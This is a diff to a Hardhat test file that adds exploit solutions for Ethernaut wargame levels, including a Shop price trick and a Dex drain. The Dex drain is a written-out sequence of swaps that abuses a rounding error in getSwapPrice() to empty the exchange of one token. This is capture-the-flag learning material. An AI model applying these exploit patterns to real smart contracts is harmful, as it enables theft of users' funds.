@@ -175,7 +175,7 @@ describe("Ethernaut", function () {
 		it("Exploit", async () => {
 			const contract = await ethers.deployContract("GatekeeperTwo");
 			await contract.waitForDeployment();
-			const exploit = await ethers.deployContract("GatekeeperTwoExploit", [contract], { from: hacker, signer: hacker });
+			const exploit = await ethers.deployContract("GatekeeperTwoExploit", [contract], { signer: hacker });
 			const entrantCurrent = await contract.entrant();
 			expect(entrantCurrent).to.equal(hacker, "Failed to pass level 14."); // become the entrant to pass the level
 		});
@@ -253,6 +253,45 @@ describe("Ethernaut", function () {
 			await owner.sendTransaction({ from: owner, to: contract, value: amount }); // deposit some ETH to the target's contract
 			await contract.setWithdrawPartner(exploit); // set the hacker's contract as the partner, hacker's contract will always revert on target's contract withdrawal
 			await expect(contract.withdraw({ gasLimit: 91000 })).to.be.rejectedWith("out of gas"); // DoS the withdrawal to pass the level | balance must stay unchanged to pass the level
+		});
+	});
+
+	describe("Level 21 - Shop", async () => {
+		it("Exploit", async () => {
+			const contract = await ethers.deployContract("Shop");
+			const exploit = await ethers.deployContract("ShopExploit");
+			await exploit.run(contract);
+			const priceCurrent = await contract.price();
+			expect(priceCurrent).to.equal(0, "Failed to pass level 21."); // get the item for free to pass the level
+			const soldCurrent = await contract.isSold();
+			assert(soldCurrent, "Failed to pass level 21.");
+		});
+	});
+
+	describe("Level 22 - Dex", async () => {
+		it("Exploit", async () => {
+			const dex = await ethers.deployContract("Dex", { from: owner });
+			const token_1 = await ethers.deployContract("SwappableToken", [dex, "Token 1", "T1", 110], { signer: owner }); // create two different ERC20 tokens
+			const token_2 = await ethers.deployContract("SwappableToken", [dex, "Token 2", "T2", 110], { signer: owner });
+			await dex.connect(owner).setTokens(token_1, token_2);
+			// --------------------
+			await dex.connect(owner).approve(owner, 220);
+			// send 10 of each tokens to the hacker for level preparation
+			await token_1.connect(owner).transferFrom(owner, hacker, 10);
+			await token_2.connect(owner).transferFrom(owner, hacker, 10);
+			// send 100 of each tokens to DEX for level preparation
+			await token_1.connect(owner).transferFrom(owner, dex, 100);
+			await token_2.connect(owner).transferFrom(owner, dex, 100);
+			// --------------------
+			await dex.connect(hacker).approve(dex, 220);
+			await dex.connect(hacker).swap(token_1, token_2, 10); // exploit the rounding error in getSwapPrice()
+			await dex.connect(hacker).swap(token_2, token_1, 20);
+			await dex.connect(hacker).swap(token_1, token_2, 24);
+			await dex.connect(hacker).swap(token_2, token_1, 30);
+			await dex.connect(hacker).swap(token_1, token_2, 41);
+			await dex.connect(hacker).swap(token_2, token_1, 45);
+			const balanceCurrentToken1 = await dex.balanceOf(token_1, dex);
+			expect(balanceCurrentToken1).to.equal(0, "Failed to pass level 22."); // drain one of the tokens to pass the level
 		});
 	});
 });
